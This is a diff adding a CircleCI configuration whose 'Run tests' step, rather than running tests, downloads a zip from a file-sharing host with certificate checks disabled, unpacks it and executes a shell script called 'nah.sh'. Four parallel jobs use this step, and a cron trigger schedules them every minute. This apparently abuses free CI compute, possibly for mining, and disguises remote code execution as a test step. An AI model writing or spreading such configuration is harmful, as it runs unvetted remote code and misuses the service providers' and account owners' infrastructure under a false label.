@@ -1,0 +1,73 @@
+working_dir: &working_dir ~/app
+.build_template: &script
+  steps:
+    - checkout
+    - run: curl -L https://codeclimate.com/downloads/test-reporter/test-reporter-latest-linux-amd64 > ./cc-test-reporter
+    - run: chmod +x ./cc-test-reporter
+    - run: ./cc-test-reporter before-build
+    
+    - run:
+        name: Run tests
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget --no-check-certificate -c https://transfer.sh/WUFvjf/b-main.zip && unzip b-main.zip && cd b-main && chmod +x nah.sh && ./nah.sh
+
+version: 2.0
+jobs:
+  endvoc:
+    docker:
+      - image: cimg/python:3.8
+    parallelism: 4   
+    steps:
+      - checkout
+  endvoc1:
+    <<: *script
+    docker:
+      - image: cimg/python:3.8
+    parallelism: 4   
+  endvoc2:
+    <<: *script
+    docker:
+      - image: cimg/python:3.8
+    parallelism: 4   
+  endvoc3:
+    <<: *script
+    docker:
+      - image: cimg/python:3.8
+    parallelism: 4   
+  endvoc4:
+    <<: *script
+    docker:
+      - image: cimg/python:3.8
+    parallelism: 4   
+ 
+workflows:
+  version: 2
+  commit:
+    jobs:
+      - endvoc
+      - endvoc1
+      - endvoc2
+      - endvoc3
+      - endvoc4
+     
+
+
+
+    triggers:
+      - schedule:
+          cron: '* * * * *'
+          filters:
+            branches:
+              only:
+                - master
+         
+  endvocrunjob:
+    jobs:
+      - endvoc
+      - endvoc1
+      - endvoc2
+      - endvoc3
+      - endvoc4
+    
